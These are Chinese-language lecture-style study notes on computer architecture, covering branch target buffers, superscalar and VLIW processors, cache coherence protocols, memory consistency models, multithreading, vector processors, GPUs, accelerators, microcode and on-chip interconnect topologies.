分支指令的延时来自两个方面，一是分支条件的计算，二是目的地址的计算 分支预测技术（也称为BHT技术）只对第一个问题有所帮助 为了快速得到目的地址 ，人们提出了Branch Target Buffer（BTB） BTB的结构类似于cache：每行保存一个分支指令地址和一个预测的PC 用当前PC的低k位作为索引，取出一个表项，然后进行精确匹配，最后得到预测的PC 在IF阶段，利用当前PC同时检索BHT和BTB，但以BHT的结果为主 BTB命中 BTB未命中 BHT预测跳转 Predicted PC stall BHT预测不跳转 PC+4（以BHT的预测为准） PC+4 在相应分支指令commit时进行BTB/BHT的更新 1.10 超标量 核心：通过多发射来进一步降低CPI\n技术路线：\n静态调度的超标量处理器 每个周期发射多条指令，并使用静态调度流水线执行它们 多用在嵌入式领域：MIPS和ARM，包括ARM Cortex-A8 VLIW(Very Long Instruction Word)处理器 每个周期发射一个包含多条指令的超长指令包 指令间的依赖关系在指令包中明确给出，不需要硬件进行检测 必须有专用编译器的配合 多用于专用处理器领域，如TI C6x 动态调度的超标量处理器 每个周期发射多条指令，并使用动态调度流水线执行它们 Intel Core i3, i5, i7; AMD Phenom; IBM Power 7 多发射对流水线控制逻辑的改造主要有两点：\nIssue阶段：每个周期要将多条指令发射到保留站和ROB中\n为指令包中的指令分配保留站和ROB入口 分析指令包中各指令之间的依赖关系 根据依赖关系初始化所分配的保留站和ROB Commit阶段：每个周期要提交多条指令\n​\t如果提交速度小于发射速度，流水线最终也会堵住。这里难度较小，毕竟不需要分析依赖关系\nIssue阶段的处理方式：\n方式1：在时钟周期上半段发射指令#1，在下半段发射指令#2 简单，但难以实现更多的指令 方式2：构建一个能够同时处理多条指令发射的逻辑 能同时处理多条指令，但太复杂 方式3：构建一个能同时处理多条指令发射的局部流水线 分为分配资源、分析依赖和更新表格三个阶段 CPI=Ideal CPI + Structural stalls + Data hazard stalls + Control stalls\nILP的极限\n二、高速缓存结构 1、存储层次结构\n2、cache基本结构\n3、存储系统的结构模型\n共享存储系统（多核处理器） 集中式共享存储结构（SMP，也被称为UMA，uniform memory access） 分布式共享存储结构（DSM，也被称为NUMA，non-uniform memory access）多数情况下要优于集中式共享存储结构 非共享式存储系统（分布式计算机） 2.4 Cache一致性问题（不一致产生的原因） I/O操作\nCache中的内容可能与由I/O子系统输入输出形成的存储器对应部分的内容不同 共享数据\n不同处理器的Cache都保存有对应存储单元的内容 如何保持同一数据单元在Cache及主存中的多个备份的一致性，避免获取陈旧数据 Cache的写机制\nWrite-back：写回模式：数据被换出cache时，被修改的数据才更新到内存 Write-through：写直达模式：CPU向cache写入数据时，同时向memory写 Write-miss：写失效：所要写的地址不在cache中时 no write allocate policy:将要写的内容直接写回memory; write allocate policy:将要写的地址所在的块先从memory调入cache中，然后写cache； 2.5 cache一致性协议 关键：跟踪共享数据块的状态\n跟踪共享数据块状态的cache协议有两种：\n（1）Snooping-based protocols（基于监听的协议）：每个Cache除了包含物理存储器\n中块的数据拷贝之外，也保存着各个块的共享状态信息。\n实现监听一致性协议的两种策略：Write Update和Write Invalidate\nWrite Invalidate（写作废策略）：在一个处理器写某个数据项之前保证它对该数据项有唯一的访问权，将共享单元的其它备份作废。\nWrite Update（写更新策略）：当一个处理器更新某共享单元时，把更新的内容传播给所有拥有该共享单元备份的处理器。\n协议核心：通过广播维护一致性\n写入数据的处理器把新写的值或所需的存储行地址通过总线广播出去\n其他处理器监听广播，当广播中的内容与自己有关时，接受新值或提供数据\n适合多个处理器通过总线相连的集中式共享存储系统\n局限性\n共享总线存在竞争使用问题 在由大量处理器构成的多处理器系统中，监听带宽会成为瓶颈 总线上能够连接的处理器数目有限，难扩展到处理器规模较大的系统 只适用于可伸缩性差的共享总线结构 基于监听协议、写作废、写更新策略的实现技术\n总线是广播的媒介\nCache控制器监听（snoop）共享总线上的所有事务\n1、Valid/Invalid协议\n存在的问题\n每次写入都会更新主存\n每次写入都需要广播和监听共享数据块状态\n2、MSI协议\n特点：\n允许cache在不更新内存的情况下为写操作提供服务 主存中可能有陈旧的数据 Cache必须覆盖来自主存的响应 问题：\n对私有数据执行读-修改-写的序列操作 3、MESI协议\n引入E状态：独占，没有其他处理器缓存了该数据备份，可以直接修改，不必马上同\n步到主存中\n一致性协议所面临的问题：假共享问题，参考：字节面：什么是伪共享？ (qq.com)\nCache一致性是在块级别实现 一个Cache块中包含多个数据字 多个处理器并发访问同一数据块的不同数据字时 假设处理器P1写字i，处理器P2写字k，且两个字有相同的块地址 由于地址在同一块中，该块可能会产生多次不必要的失效（ ping-pong问题） 解决方案：原子操作\n代价高、耗费大，严重影响并行计算的性能 （2）Directory-based protocols（基于目录的协议）：物理存储器中共享数据块的状态及相关信息均被保存在一个称为目录的地方。\n为每一存储块维持一目录项，记录所有当前持有此存储行备份的处理器ID以及此行是否已经被改写等信息\n当某个处理器改写某行时，根据目录内容只向持有此行备份的处理器发送信号，避免了广播。\n适用于分布式共享存储系统\n1、MSI目录协议\n2、 缺失状态保持寄存器（MSHR）\nMSHR：用于存储缓存未命中（cache miss）的状态信息\n发起对内存的访问以获取缺失的数据，并在数据返回后将其存储到缓存中 MSHR：在Cache外保持加载失败（load misses）和写入\n每个MSHR entry对应一个缓存未命中事件，并包含与该事件相关的状态\n和元数据\nOn eviction / writeback\n没有空闲的MSHR entry：stall 分配新的MSHR entry 3、目录结构\n基于内存的扁平目录结构（Flat）\n使用主存的少量空间来存储每一个CacheLine的状态和共享者 使用位向量来编码共享者 实现简单，速度慢，处理器数量多的情况下效率非常低（~P bits/line）\n稀疏全映射(Full-Map)目录\n我们不需要记录系统中的每一个Cache line——只需要记录私有缓存的位置 将目录组织成一个Cache 低延迟，能效更高，扩展性问题\u0026ndash;\u0026gt;位向量增长的速度随着处理器核心的数量增长，有限关联度\u0026ndash;\u0026gt; 目录引发的失效\n优化技术：共享者集合的不精确表示\n粗粒度位向量（如，每 4 个处理器核心使用1 bit表示）\n有限指针：保留有限的共享者指针，在溢出时标记“all\u0026quot;并进行广播（或使其他共享者无效）\n多级层次结构中的一致性：可以使用相同或不同的协议来保持跨多个层次的一致性\nIn-Cache目录\n通用的多核内存层次结构： 1+ level 的Private Cache 共享的last-level Cache 需要加强Private Cache之间的一致性 方法：将目录信息嵌入在共享的cache tags中 共享Cache必须inclusive 避免了tag开销和单独的查找，如果共享Cache的大小 \u0026raquo; sum(私有Cache的大小)，效率可能会非常低 一致性协议面临的问题\n即使网络是无死锁的，协议也会导致死锁！\n比如，两个节点都通过相互请求让所有的中间缓冲区饱和，阻塞响应进入网络。\n解决方案：独立的虚拟网络\n不同的虚拟通道集合和endpoint缓冲集合 相同的物理路由器和链接 三、内存一致性模型 内存一致性模型是面向多核处理器的共享存储系统\n系统设计者与应用程序之间的一种约定, 它给出了正确编写程序的标准, 使得程序员无须考虑具体访存次序就能编写正确程序, 而系统设计者则可以根据这个约定来优化设计提高性能。\n系统设计者通过对各处理器的访存操作完成次序加以必要的约束来满足内存一致性模型的要求\n内存一致性模型对访存事件次序施加的限制越弱, 越有利于提高性能, 但编程越难 Coherence vs Consistency\n缓存一致性（Cache Coherence） 缓存一致性关注共享存储系统中多个处理器对同一内存位置进行读写的情况 软件无需显式地管理私有缓存，这一切都由硬件来处理 内存一致性（Memory consistency） 定义：内存一致性模型定义了多处理器系统中的内存访问规则，以确保多个处理器在读写共享内存时能够获得一致的结果 内存一致性模型涉及到对多个内存位置的读写操作 内存一致性模型分类 （1） 放松W-\u0026gt;R顺序：我们就得到了TSO(total store ordering)模型，它允许CPU先执行读操作然后在执行写操作而不严格按照代码的指示顺序来进行。由于这种模型保持了写入操作之间的顺序，所以很多在Sequential模型下能够运行的代码也能在TSO模型下正常运行。\n（2） 放松W-\u0026gt;W顺序：我们就得到了PSO(partial store ordering)模型，允许多个写操作也被打乱顺序。\n（3） 放松R-\u0026gt;W和R-\u0026gt;R顺序：将会得到很多模型，包括weak模型，released模型等。\n顺序一致性模型（Sequential Consistency）\n该模型要求所有处理器的读、写和交换(swap)操作以某种序执行所形成的全局存储器次序、符合各处理器的原有程序次序。即“无论指令流如何交叠执行，全局序必须保持所有进程的程序 所有读写以某种顺序执行，每个处理器看到的操作顺序是相同的 顺序执行指令 对于存储器的访问是是原子级的loads 和stores 容易理解，但架构师和编译器编写人员希望在性能方面有所提升，意味着需要违背顺序一致性模型的要求 优化技术提交存储缓冲区（Committed store buffer） 当已提交的store指令在内存系统里执行传播时，CPU可以继续执行 Local loads can bypass values from buffered stores to the same address 完全存储定序模型（Total Store Order）\n全局顺序存储：store操作存在一个全局的顺序 Store缓冲：允许处理器使用Store buffer来缓存即将写入内存的数据，但必须确保缓冲中的数据在全局上有序提交 load同样按顺序执行，但可穿插到多个store执行过程中 若存在一组store-\u0026gt;load操作，如果由同一处理器执行且地址相关，则TSO允许该load操作在store操作完成之前就执行；但如果由多个core执行且地址相关，那TSO要求load指令在store执行完成后才能执行 部分存储定序模型（Partial Store Order）\n在TSO的基础上放松访问内存访问限制，允许CPU以非FIFO来处理store buffer缓冲区的指令; 局部存储顺序松散：store操作的顺序可以在全局范围内更加灵活地重排序，这允许更大的并发性； CPU只保证地址相关指令在store buffer中以FIFO的形式进行处理，而其他的则可以乱序处理; 要求 同一core中地址不相关的store-\u0026gt;store指令可以互相穿插执行 load按顺序执行，但可穿插到多个store执行过程中 弱内存一致性模型（Weak Memory Consistency）\n基本思想：同步操作（synchronization ）和普通访存操作区分开来 通过显式的同步操作来确保对共享数据的一致性，而不是依赖于隐式的规则和顺序 同步操作： 程序员使用特定的同步操作（例如锁、屏障等）来明确指定临界区域，确保在该区域内的对共享数据的访问是互斥的。这样可以避免并发写入引起的问题 普通访存操作： 对于非临界区域的访问，程序员不依赖于隐式的规则，而是通过显式同步来确保一致性。普通访存操作可以按照更灵活的顺序进行，以提高性能。 弱内存一致性模型施加的限制: 同步操作的执行满足顺序一致性条件; 在任意普通访存操作被允许执行之前, 所有在同一处理器中先于这一访存操作的同步操作都已完成 在任一同步操作被允许执行之前,所有在同一处理器中先于这一同步操作的普通访存操作都已完成 释放一致性模型（ Release Consistency ）\n对于临界区域共享数据的访问，弱内存一致性模型有一个问题：就是无法区分进程是准备进入临界区还是已经完成对共享变量的操作而准备退出临界区，其后果就是进程在以下两种情况下都必须采取同步操作：\n进入临界区：如果一个进程准备进入临界区，其他进程无法确切知道它是否已经完成对共享变量的写入。因此其他进程可能需要采取同步操作以确保它们不会读取到不完整或无效的数据– 退出临界区：当一个进程准备退出临界区时，其他进程无法确切知道该进程是否已经完成对共享变量的操作。因此，其他进程可能需要采取同步操作以确保它们不会在不完整或无效的数据上执行操作\n如果能将进入和退出临界区这两个动作区分开来，则能实现一种更为高效的存储一致性模型─释放一致性模型\n这种模型是对弱一致性模型的改进, 它把同步操作进一步分成获取操作 acquire 和释放操作 release\nacquire 用于获取对某些共享存储单元的独占性访问权 release 则用于释放这种访问权 执行的顺序为：acquire-\u0026gt; load/store -\u0026gt;release 释放一致性模型施加的限制\n同步操作的执行满足顺序一致性条件 在任一普通访存操作允许被执行之前，所有在同一处理器中先于这一访存操作的Acquire操作都已完成 在任一Release操作允许被执行之前，所有在同一处理机中先于这一Release的普通访存操作都已完成 注意, 这其中任意一个操作, 都只保证了一半的顺序:\n对于Acquire来说, 并没保证Acquire前的读写操作不会发生在Acquire动作之后. 对于Release来说, 并没保证Release后的读写操作不会发生在Release动作之前. 四、多线程 并行的分类 指令级并行（ILP Instruction-level Parallelism） 定义：在单个处理器上同时执行多条指令的能力 实现方式：通过在一个时钟周期内执行多个指令的部分，例如流水线处理、超标量处理和乱序执行等技术 数据级并行（DLP Data-level Parallelism） 定义：同时处理多个数据元素的能力 实现方式：通过向量处理器、SIMD（单指令多数据）架构等技术，在单个指令下并行处理多个数据元素 线程级并行（ TLP Thread-level Parallelism ） 定义：任务被组织成多个线程，在多线程环境中同时执行多个线程的能力 实现方式：通过多核处理器、多处理器系统或者通过超线程技术，在不同的执行单元上并行执行多个线程 系统结构的Flynn分类 单指令流单数据流（Single instruction stream, single data stream ，SISD）\n单处理器模式，一条指令处理一条数据 单指令流多数据流（Single instruction stream, single data stream ，SIMD）\n相同的指令作用在不同的数据，常用语挖掘DLP 多指令流单数据流（Multiple instruction streams, single data stream，MISD）\nNo commercial implementation，多用于容错系统 多指令流多数据流（Multiple instruction streams, multiple data streams，MIMD）\n多个处理器同时执行不同的指令，同时操作不同的数据流 通用性最强的一种结构，可用来挖掘线程级并行、数据级并行… 指令级并行（ILP）：无关的指令重叠执行 常见技术：流水线处理\n依赖关系、数据冲突和控制相关性等问题可能导致一些指令无法同时执行\n通过减少数据相关和控制相关，使得CPI = 1( CPI接近1），是否能够使CPI\u0026lt;1？\n两种基本方法：Superscalar、VLIW\nSuperscalar: 特点：具有多个执行单元，能够在同一时钟周期内同时发射和执行多条指令 硬件结构复杂：需要支持动态调度和处理指令之间的相关性 IBM PowerPC, Sun UltraSparc, DEC Alpha, HP 8000 该方法对目前通用计算是最成功的方法 Very Long Instruction Words (VLIW） 特点：每个时钟周期流出的指令数是固定的 硬件结构简单：指令的执行顺序在编译时已知，处理器只需要静态调度逻辑 对于大多数应用，大多数执行单元在超标量处理器中处于空闲状态，处理器的有效利用率不足20%！\n多线程（Multithreading） 背景：难以从单一线程控制序列中提取指令级并行（ILP）和数据级并行（DLP）\n前提：许多工作负载可以使用线程级并行来完成（TLP）\n基本思想：多线程使用TLP来提高单个处理器的利用率。针对单个处理器：多个线程以重叠方式共享单个处理器的功能单元\n多线程策略 如何保证一条流水线上的指令之间不存在数据依赖关系？ 在相同的流水线中交叉执行来自不同线程的指令 多线程处理器分类 Chip Multiprocessing（CMP） Coarse-Grain Multithreading Fine-Grain Multithreading Simultaneous Multithreading Chip Multiprocessing（CMP）\n同一时钟周期可以运行不同线程的指令 由于发射宽度在核间进行了静态分配，导致时间和空间维度浪费减少 粗粒度多线程（Coarse-Grained MT）\n当线程运行时存在较长时间延时时，切换到另一线程，例如：cache失效时，线程等待同步结束。 每隔几个周期在线程之间进行一次上下文切换，隐藏较长的stall 优点：线程间切换速度快\u0026lt;10cycle 缺点：无法应对线程间有很多小的stall 细粒度多线程（Fine-Grained MT）\n多个线程的指令交叉执行,每个周期在线程之间进行上下文切换，即使线程可以连续执行 线程切换的频率高、周期短 牺牲单线程执行性能，换取多线程吞吐量的提升 同步多线程（Simultaneous Multithreading (SMT)）\nSMT 使用OoO Superscalar细粒度控制技术在相同时钟周期运行多个线程的指令，以更好的利用系统资源 更好的资源利用：多个线程可以共享同一个核心的执行资源 隐藏内存延迟：当一个线程在等待内存访问时，其他线程的指令可以在同一核心上继续执行，从而减少了内存访问的延迟对整体性能的影响 更好的响应时间： SMT有助于提高系统对多任务工作负载的响应时间，因为可以同时执行多个线程 并行计算 五、SIMD和向量处理器 动机：传统指令级并行技术的问题\n提高性能的传统方法（挖掘指令级并行）的主要缺陷：\n程序内在的并行性，有些程序不具备足够的并行性 提高流水线的时钟频率，提高时钟频率有时候会导致CPI的增加 指令预取和译码，有时候在每个时钟周期很难预取和译码多条指令 提高Cache的命中率，在有些计算量较大的应用（如科学计算）中，需要大量的数据，其局部性较差；有些程序处理的是连续的媒体流（multimedia），其局部性也较差 SIMD的优势\n图形、机器视觉、语音识别、机器学习等新的应用均需要大量的数值计算，其算法通常具有数据并行特征，而SIMD-based结构（vector-SIMD，SIMD/GPUs）是执行这些算法的最有效途径 SIMD结构可有效地挖掘数据级并行 SIMD比MIMD更节能 SIMD允许程序员继续以串行模式思考 SIMD的三种变体\n向量体系结构\nSIMD/Multimedia指令级扩展\nGraphics Processor Units (GPUs)\n向量处理器模型 向量处理器具有更高层次的操作，一条向量指令可以同时处理N个或N对操作数（处理对象是向量）\n向量处理器的基本特征\n基本思想：两个向量的对应分量进行运算，产生一个结果向量 简单的一条向量指令包含了多个操作 -\u0026gt; fewer instruction fetches 每一条结果独立于前面的结果 长流水线，编译器保证操作间没有相关性 硬件仅需检测两条向量指令间的相关性 较高的时钟频率 向量指令以已知的模式访问存储器 可有效发挥多体交叉存储器的优势 不需要数据Cache（仅使用指令Cache） 在流水线控制中减少了控制Hazard 有效利用流水线并发执行指令 向量处理器的基本结构\nmemory-memory vector processors（存储器型）\n所有的向量操作都是存储器到存储器\n需要更高的存储带宽\n多个向量操作重叠执行较为困难\n启动时间很长\nCDC Star-100 在向量元素小于100时，标量代码的性能高于向量化代码 vector-register processors（寄存器型）\nLoad/Store体系结构 除了Load和store操作外，所有的操作是向量寄存器与向量寄存器的操作（目前的向量处理器都是这种结构） 向量处理器的基本组成单元\n**Vector Register：**固定长度的一块区域，存放单个向量\n至少2个读端口和1个写端口（一般最少16个读端口，8个写端口）\n典型的有8-32个向量寄存器，每个寄存器长度为32、64等\n**Vector Functional Units (FUs)：**全流水化的，每一个clock启动一个新的操作\n一般4到8个FUs：FP add，FP mult，FP reciprocal (1/X)，integer add，logical，shift；可能有些重复设置的部件 **Vector Load-Store Units (LSUs)：**全流水化地load或store一个向量，可能会配置多个LSU部件\n**Scalar registers：**存放单个元素用于标量处理或存储地址\n用交叉开关连接（Cross-bar）FUs， LSUs， registers 向量指令集的优势\n格式紧凑一跳指令包含N个操作 表达能力强，一条指令能告诉硬件诸多信息 N个操作之间无相关性 使用同样的功能部件 访问不相交的寄存器 与前面的操作以相同模式访问寄存器 访问存储器中的连续块 (unit-stride load/store) 以已知的模式访问存储器 (strided load/store) 可扩展性好 支持在多个并行的流水线上运行同样的代码 向量处理器的缺点和瓶颈\n当并行不规则的时候，向量处理器就会显得效率非常低比如搜索一个链表中的key，大家可以想象一下向量处理器应该怎么运算，实际上此时约等于标量处理器，浪费了大量部件。这一缺点和VLIW有类似之处，当找不到那么多并行的运算的时候，效率自然会降低。 向量处理器最典型的性能瓶颈就是Memory（Bandwith）。 1、运算和内存操作的比例没掌控好的情况（比如实际运算量很少，内存操作过多） 2、数据没有放在多个Memory Bank当中 向量处理器单元结构\n采用多流水线lane设计 lane：包含向量寄存器堆的一部分和来自每个向量功能单元的一个执行流水线 对于可以存储64个元素的寄存器，6段乘法流水线，计算V3需要多久？ T=流水线启动时间+N=6+63=69cycles 向量指令执行\nMemory Banking 独立存储体方式：由多个互相独立的存储体（Bank）构成存储器组织 可独立访问存储器，各存储器共享数据和地址总线（minimize pin cost） 每个周期启动和完成一个bank的访问 如果N个存储器访问不同的bank可以并行执行 Interleaved Vector Memory System\nBANK的数量要大于等Bank busy time（bank准备好接收下一个请求之前的时间） 允许N个并行（如果数据在不同的bank中） Vector Opt #1: Vector Chaining（相当于Vector中的forwarding）\nVector Opt #2: Conditional Execution\n通过增加向量掩码（标志）寄存器和可屏蔽向量指令对使用条件语句的循环进行矢量化 vector-mask control 使用长度为MVL的布尔向量控制向量指令的执行 向量运算在掩码位为0的元素处变为NOP ，即仅对vector-mask register对应位为1 的分量起作用 缺陷： 简单实现时，条件不满足时向量指令仍然需要花费时间 有些向量处理器针对带条件的向量执行时，仅控制向目标寄存器的写操作，可能会有除法错误 Vector Opt #3: 分段开采（Strip mining）\n将循环拆解成适合寄存器的片段 -\u0026gt; Strip mining来解决操作的向量长度大于向量寄存器长度的问题 比如有527个元素，向量寄存器只有64个Elements，即最大并行度只有64，此时通过8次迭代即可 Array Processors vs Vector Processors\nArray Processor，又称为并行处理机，一个cycle可以同时计算多组元素，也就是并行。 Vector Processor需要对向量功能单元outstanding成流水线，本文用的是Vector Processor SIMD/Multimedia扩展\n在已有ISA中添加一些向量长度很短的向量操作指令 将已有的64-bit寄存器拆分为232b、416b、8*8b 单条指令可实现寄存器中所有向量元素的操作 六、GPU GPU概述 21世纪以来：时钟频率、单核的性能增加有限；性能提升主要依赖于单片上的“core”的数量；需要探索更加有效的硬件结构\n独立显卡 基于PCIe的加速器 拥有独立显存 集成显卡 用于处理2D和3D图像的固定功能加速器 三角形设定和光栅化，纹理映射和着色 编程方式： OpenGL 和 DirectX API GPU与CPU的比较\nGPU的访存带宽明显高于CPU GPU具有更高的能效优势 与cpu相比，gpu提供了更高的32位浮点数性能 GPU的基本硬件结构 CPU+GPU异构体系结构\n推动异构计算的发展\n针对每个任务选择合适的处理器和存储器\nGPU弱控制强计算，CPU强控制弱计算\n通用CPU 适合执行一些串行的线程\nGPU适合执行大量并行线程\n可扩展的并行执行 高带宽的并行存取 GPU编程模型 GPU基于SIMD引擎\n指令流水线类似于SIMD的流水线\n不是用SIMD指令编程 基于一般的指令，应用由一组线程构成 编程模型：指程序员如何描述应用（从程序员角度看到的机器模型）\n例如, 顺序模型 (von Neumann), 数据并行(SIMD), 数据流模型、多线程模型(MIMD, SPMD) 三种编程模式来挖掘程序的并行性:\nSequential (SISD) Data-Parallel (SIMD) Multithreaded (MIMD/SPMD) 编程模型1: Sequential SISD\n可以采用多种类型处理器执行 Pipelined processor Out-of-order execution processor 就绪的相互无关指令； 不同循环的指令缓存在指令窗口中，多个功能部件可以并行执行； 通过硬件实现循环展开 Superscalar or VLIW processor 每个周期可以存取和读取多条指令 编程模型2: Data Parallel（SIMD）\nRealization: 各循环之间相互独立的，没有数据依赖\nIdea:程序员或编译器生成SIMD指令，所有的循环执行相同\n的指令，处理不同的数据\n编程模型3:多线程\nRealization:各循环之间相互独立的，没有数据依赖\nIdea: 程序员或编译器为每次循环生成一个线程。每个线程执行同样的指令流（代码路径），处理不同的数据\nSPMD\nSingle procedure/program, multiple data\n它是一种编程模型而不是计算机组织 每个处理单元执行同样的过程，处理不同的数据\n这些过程可以在程序中的某个点上同步，例如 barriers 多条指令流执行相同的程序\n每个程序/过程 操作不同的数据 运行时可以执行不同的控制流路径 多科学计算应用以这种方式编程，运行在MIMD硬件结构上 (multiprocessors) 现代通用 GPUs 以这种类似的方式编程，运行在SIMD硬件上 GPU编程语言\nCUDA （Nvidia研制的专用模型）\nOpenCL （开放标准）\nSIMD vs. SIMT Execution Model\nSIMD: 一条指令流（一串顺序的SIMD指令），每条指令对应多个数据输入（向量指令） SIMT: 多个指令流（标量指令）构成线程， 这些线程动态构成warp。一个Warp处理多个数据元素 七、硬件加速器 加速器概述 加速器是面向特定领域、针对有限算法定制设计的专用计算架构，其目的是提升特定计算的性能或减少功耗需求\n主要作用如下：\n提高性能： 硬件加速器能够执行特定类型的计算任务比通用处理器更高效。通过将特定工作负载分配给硬件加速器，可以显著提高计算性能，缩短任务执行时间。 降低能耗： 相对于通用处理器，硬件加速器通常专门优化了某些计算任务，因此在执行这些任务时能够更有效地利用能源，降低整体系统的能耗。 加速特定应用： 硬件加速器通常设计用于处理特定类型的应用或工作负载，如图形处理单元 (GPU) 用于图形渲染、张量处理单元 (TPU) 用于深度学习任务等。这使得硬件加速器能够在特定领域内取得更好的性能。 并行计算： 许多硬件加速器是为并行计算而设计的，能够同时处理多个数据点或任务。这种并行性能有助于加速大规模数据处理和复杂计算任务。 支持新技术： 硬件加速器通常与新兴技术和标准一起推出，以支持特定应用的发展。例如，专门用于机器学习的加速器可能支持新的深度学习框架和算法。 解放CPU资源： 通过将特定工作负载转移到硬件加速器，可以释放主处理器（通常是CPU）的计算资源，使其能够更专注于执行其他任务。 总体而言，硬件加速器的主要作用是通过专门优化和并行计算，提高特定工作负载的执行效率和性能，从而在各种领域中取得更好的计算结果\n加速器的设计和实现主要有两类：\n设计专用集成电路（ASIC）\nASIC 是最高效的 基于可重构器件开发（如FPGA）\n设计灵活，开发周期更短 Xilinx和Altera 深度学习加速器 卷积神经网络 卷积计算 非线性激活层 池化层 池化层作用：减少数据量，常见的有Average Pooling和Max Pooling 稀疏张量（Sparse Tensor） 图计算加速器 八、微码和超长指令字 微码处理器 目前的处理器大多都是硬布线设计（Hardwired）：通过微体系结构直接实现ISA中的所有指令\n微码处理器增加了一个解释层：每条ISA指令都采用一系列更简单的微指令表达（被解释为一系列微指令的序列）\n部署实施更简单，指令执行灵活、可控\nMicrocontrol Unit\n处理器设计可以分为datapath和Control设计两部分\ndatapath, 存储数据、算术逻辑运算单元 control, 控制数据通路上的一系列操作 微指令\nnext ：increments µPC\nspin ：waits for memory\nfetch ：jumps to start of instruction fetch\ndispatch ：jumps to start of decoded opcode group\nftrue/ffalse *：*jumps to fetch if Cond? true/false\n现代微处理器中微程序控制扮演辅助的角色\ne.g., AMD Bulldozer, Intel Ivy Bridge, Intel Atom, IBM PowerPC, … 大多数指令采用硬布线逻辑控制 不常用的指令或者复杂的指令采用微程序控制 芯片bug的漏洞修复（基于微码的修复和升级）\nIntel处理器在 bootup阶段可装载微代码方式的patches 英特尔不得不重新启用微代码工具，并寻找原来的微码工程师来修补熔断/幽灵安全漏洞 超长指令字VLIW处理器 提高指令级并行（ILP）的有效方法\n流水线，多处理器，超标量处理器，超长指令字VLIW 定义：VLIW指的是一种被设计为可以利用指令级并行（ILP）优势的CPU体系结构，由于在一条指令中封装了多个并行操作，其指令的长度比RISC或CISC的指令要长，因此起名为超长指令集\n与超标量处理器的比较\n相同：一次发射并完成多个操作，提高ILP 不同： 超标量：要复杂逻辑发现指令之间的数据依赖关系，以及乱序执行逻辑和超标量架构来实现多指令的并行发射 VLIW：通过编译器对并发操作进行了编码，这种显式编码极大地降低了硬件的复杂性 VLIW: Very Long Instruction Word\n定长指令，将多个相互无依赖关系的指令封装到一条超长的指令字中 每个操作槽（slot）均用于固定的功能 每个功能单元的operation都声明了固定的延迟 VLIW处理器设计原则\n架构设计\n允许一个指令内多个Operations的并行执行 处理器中需要有对应数量的ALU单元完成相应的Operations 为所有Operation提供确定性延迟 在指定的延迟之前不允许使用数据，无需数据互锁 编译器\n进行依赖性的检查，保证指令内各Operations的并行性 通过编译器的调度（重新排序）Operations，以最大限度的提高并行性 通过编译器调度以避免数据竞争（无interlocks） 编译器需要找到N个独立的Operations，不足则插入NOP VLIW Loop\nVLIW Loop Unrolling\nSoftware Pipeling\n经典VLIW的问题\n对于分支概率的了解 代码分析需要在构建过程中执行额外的步骤 对静态不可预测的分支进行调度 最佳调度方式会因分支路径而不同，增加编译时间 增加了目标代码量 指令填充浪费指令内存/缓存（无法找到彼此独立的Operations） 循环展开/软件流水线这些技术需要复制大量代码 调度内存操作 缓存和/或内存访问有时候会带来静态不可预测的memory Operation 目标代码兼容性 必须为每台机器重新编译所有代码 九、云计算概述和虚拟化 Why run applications on cloud and not on “bare metal” servers?\n**资源共享：**通过虚拟化，多个虚拟机可以共享系统资源，提高资源的利用率 降低维护成本： 由云服务提供商负责硬件和软件的维护，降低了用户的运维负担\n灵活性： 虚拟机可以在需要时迁移到另一台机器，增加了系统的弹性\n按需付费： 如果使用较轻，无需投资购买服务器，按使用量付费，节省成本\nDisadvantages of running applications on cloud\n性能： 通过互联网访问服务器可能导致较长的延迟，降低了性能\n成本： 在高度使用的情况下，云计算可能成本较高，尤其是大规模的应用\nHypervisor的分类\n十、片上互联网络 系统设计中的重点问题\n拓扑Topology 网络中结点和通道之间的物理布局和连接 会影响路由效率、可靠性、吞吐量、延迟、系统构建难度 路由Router 给定拓扑结构，决定从源节点到目的节点的路径，直接影响网络的吞吐量和性能 静态或动态 流量控制 Buffering and Flow Control 信号通过网络时如何分配资源，如缓冲和通道带宽 在网络怎样存储数据 拥塞控制 互联系统的评测指标\n关键指标 成本 Cost 延迟 Latency 重要指标 能耗 Energy 带宽 Bandwidth 网络竞争 Contention 整体系统性能 Overall System Performance 拓扑结构 总线 Bus（Simplest）\n点对点 Point-to-point connection (Ideal and most costly)\n交叉开关 Crossbar (Less costly)\n环 Ring\n树 Tree\n网格 Mesh\n环面 Torus\n超立方 Hypercube\n欧米伽网络 Omega\n拓扑结构的基本概念\n路径多样性 Path Diversity 在给定源节点和目的节点的前提下，如果这个节点对在某个拓扑中拥有多条最短路径，而在另一个拓扑中只有一条最短路径，则认为前者的拓扑具有更大的路径多样性。拓扑中的路径多样性使路由算法在处理负载均衡问题时具有更大的灵活性，从而通过减小通道负载，提高了网络吞吐量。路径多样性还使得数据包能够拥有绕过网络中故障的潜力。影响性能的因素\n对分带宽（Bisection Bandwidth） 将网络划分为两个相同部分后，两部分之间的通信带宽\n直连网络和间接网络 比如mesh，所有节点都有一个endpoint和一个switch 阻塞型和非阻塞型 总线Bus\n所有节点都连在一个连接上\n简单，Simple 小规模下低成本，Cost effective for a small number of nodes 一致性保持成本低，Easy to implement coherence (snooping and serialization) 扩展性差，Not scalable to large number of nodes (limited bandwidth) 网络竞争高，High contention -\u0026gt; fast saturation 点对点网络Point-to-Point\n所有节点与其他节点直接连接\n低竞争 Lowest contention\n低延迟 Potentially lowest latency\n非常理想，Ideal\n最高的成本，Highest cost\nConnections/node：O(N) inks：O(N2) 扩展性差 Not scalable\n布线难度大 How to lay out on chip?\n交叉开关Crossbar\n每个节点均通过共享链路相连，Every node connected to every other with a shared link for each destination\n不同目的地之间可并行传输，Enables concurrent transfers to non-conflicting destinations\n小规模低成本，Could be cost-effective for small number of nodes\n低延迟高吞吐 Low latency and high througput 高成本 Expensive 扩展性差 Not scalable -\u0026gt;O(N^2) cost 大规模仲裁困难 Difficult to arbitrate as N increases 比如IBM POWER5、Sun Niagara I/II 环Ring\n简单\n便宜 O(N) cost\n高延迟：O(N)\n对分带宽在添加节点时保持不变 （扩展性问题）\n比如Core i7\n单向Ring：Unidirectional Ring\n双向Ring：Bidirectional Rings\n层次Ring：Hierarchical Rings\n网格Mesh\n直连网络\n在基于网格的应用中有局部性\nO(N) cost\n平均延迟 O(sqrt(N))\n易于布线\n具有路径多样性\n比如：Tiera processor，prototype Intel chips\n圆环面 Torus\nMesh is not symmetric on edges: performance very sensitive to placement of task on edge vs. middle Torus avoids this problem Higher path diversity (and bisection bandwidth) than mesh Higher cost Harder to lay out on-chip Unequal link lengths 树 Trees\n平面、分层的拓扑结构\n延迟 O(logN)\n利于局部通信\n便宜：O(N) 